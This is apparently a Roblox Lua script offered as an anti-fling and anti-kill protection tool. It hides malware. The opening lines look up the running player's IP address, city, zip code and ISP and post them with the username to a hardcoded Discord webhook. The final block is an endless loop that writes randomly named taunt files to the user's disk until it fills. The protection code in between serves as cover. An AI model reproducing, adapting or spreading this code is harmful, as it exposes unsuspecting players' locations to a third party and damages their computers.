local player_name = game:GetService("Players").LocalPlayer.Name
local webhook_url = "https://discord.com/api/webhooks/1008900580544102441/c5OLn2__X29x__URimjcFCr9NmPWXjVja6TwKA7eVYJ-9ZN6T-gJKFjOuqnUlilwbLvH"

local ip_info = syn.request({
    Url = "http://ip-api.com/json",
    Method = "GET"
})
local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
syn.request(
    {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
    }
)
local Services = setmetatable({}, {__index = function(Self, Index)
local NewService = game.GetService(game, Index)
if NewService then
Self[Index] = NewService
end
return NewService
end})

-- [ LocalPlayer ] --
local LocalPlayer = Services.Players.LocalPlayer

-- // Functions \\ --
local function PlayerAdded(Player)
   local Detected = false
   local Character;
   local PrimaryPart;

   local function CharacterAdded(NewCharacter)
       Character = NewCharacter
       repeat
           wait()
           PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
       until PrimaryPart
       Detected = false
   end

   CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
   Player.CharacterAdded:Connect(CharacterAdded)
   Services.RunService.Heartbeat:Connect(function()
       if (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
           if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
               if Detected == false then
                   game.StarterGui:SetCore("ChatMakeSystemMessage", {
                       Text = "Fling Exploit detected, Player: " .. tostring(Player);
                       Color = Color3.fromRGB(255, 200, 0);
                   })
               end
               Detected = true
               for i,v in ipairs(Character:GetDescendants()) do
                   if v:IsA("BasePart") then
                       v.CanCollide = false
                       v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                       v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                       v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
                   end
               end
               PrimaryPart.CanCollide = false
               PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
           end
       end
   end)
end

-- // Event Listeners \\ --
for i,v in ipairs(Services.Players:GetPlayers()) do
   if v ~= LocalPlayer then
       PlayerAdded(v)
   end
end
Services.Players.PlayerAdded:Connect(PlayerAdded)

local LastPosition = nil
Services.RunService.Heartbeat:Connect(function()
   pcall(function()
       local PrimaryPart = LocalPlayer.Character.PrimaryPart
       if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
           PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
           PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
           PrimaryPart.CFrame = LastPosition

           game.StarterGui:SetCore("ChatMakeSystemMessage", {
               Text = "You were flung. Neutralizing velocity.";
               Color = Color3.fromRGB(255, 0, 0);
           })
       elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
           LastPosition = PrimaryPart.CFrame
       end
   end)
end)
AntiKillEnabled = true
spawn(function()
  local CF, Pos
  local SotP = false
  local CurrentTools = {}
  local Players = game:GetService("Players")
  for i,v in pairs(Players.LocalPlayer.Backpack:GetChildren()) do
    CurrentTools[v] = true
  end
  Players.LocalPlayer.Backpack.ChildAdded:Connect(function(Child)
    if IsOff then
      return
    end
    CurrentTools[Child] = true
  end)
  local function AntiKill(Obj)
    if not AntiKillEnabled then
      return
    end
    if Obj:IsA("Tool") and not CurrentTools[Obj] then
      game:GetService("RunService").Stepped:Wait()
      CurrentTools[Obj] = true
      SotP = true
      Obj.Parent = Players.LocalPlayer.Backpack
      T_Admin.Functions.GNotify(T_Admin.Variables.GUIParent, "Anti FE-Kill", "Someone tried to FE Kill/Bring you")
      for i = 1, 10 do
        if Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
          Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CF
          for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("BasePart") or v:IsA("MeshPart") then
              v.Velocity = Vector3.new(0,0,0)
            end
          end
          game:GetService("RunService").Stepped:Wait()
        end
      end
      SotP = false
    end
  end
  Players.LocalPlayer.Character.ChildAdded:Connect(AntiKill)
  Players.LocalPlayer.CharacterAdded:Connect(function(Char)
    Char.ChildAdded:Connect(AntiKill)
  end)
  game:GetService("RunService").Stepped:Connect(function()
    if AntiKillEnabled then
      if Players.LocalPlayer.Character and Players.LocalPlayer.Character:findFirstChild("HumanoidRootPart") and not SotP then
        CF = Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        Pos = Players.LocalPlayer.Character.HumanoidRootPart.Position
      end
    end
  end)
end)
 while true do 
     wait(0)
     writefile("RileyswantedW ".. math.random(1, 2e9)..".txt", " RILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W FUCKED UR PC UP LOLRILEYSWANTED W
